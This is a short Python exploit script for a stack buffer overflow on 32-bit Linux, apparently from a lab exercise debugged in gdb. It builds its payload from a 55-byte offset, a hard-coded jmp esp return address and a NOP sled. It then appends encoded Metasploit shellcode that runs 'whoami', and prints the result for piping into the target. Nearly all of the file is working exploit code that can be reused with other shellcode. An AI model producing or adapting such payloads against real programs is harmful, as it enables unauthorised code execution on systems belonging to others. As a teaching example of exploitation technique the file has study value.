### Verified this works
###to execute script and pass into stdin in gdb # r <<< $(python demoexp.py)

###offset needed to crash
#buffer = "A" * 200

###buffer overflow pattern from wiremask.eu
#buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag"

###offset needed to exploit
buffer = 'A' * 55

###jmp esp #env - gdb func #info proc map# find /b start_mem, end_mem,0xff,0xe4
#0xf7defb59
#0xf7f648ab
#0xf7f705fb

eip = '\x59\xfb\xde\xf7'

nop = '\x90' * 10 #May need to adjust the 10.

###Metasploit shellcode 
###generate -b "\x00\x0d\x20\x0a" -f python

# generate -b "\x00\x0d\x20\x0a" -f python
# linux/x86/exec - 69 bytes
# https://metasploit.com/
# Encoder: x86/shikata_ga_nai
# VERBOSE=false, PrependFork=false, PrependSetresuid=false, 
# PrependSetreuid=false, PrependSetuid=false, 
# PrependSetresgid=false, PrependSetregid=false, 
# PrependSetgid=false, PrependChrootBreak=false, 
# AppendExit=false, CMD=whoami, NullFreeVersion=false
buf =  b""
buf += b"\xbe\x31\x64\xbe\x16\xda\xc3\xd9\x74\x24\xf4\x58"
buf += b"\x31\xc9\xb1\x0b\x83\xc0\x04\x31\x70\x10\x03\x70"
buf += b"\x10\xd3\x91\xd4\x1d\x4b\xc3\x7b\x44\x03\xde\x18"
buf += b"\x01\x34\x48\xf0\x62\xd2\x89\x66\xaa\x40\xe3\x18"
buf += b"\x3d\x67\xa1\x0c\x3a\x67\x46\xcd\x32\x0f\x29\xac"
buf += b"\xd1\xa6\xb5\x79\x79\xb1\x57\x48\xfd"


#print(buffer)

print(buffer + eip + nop + buf)


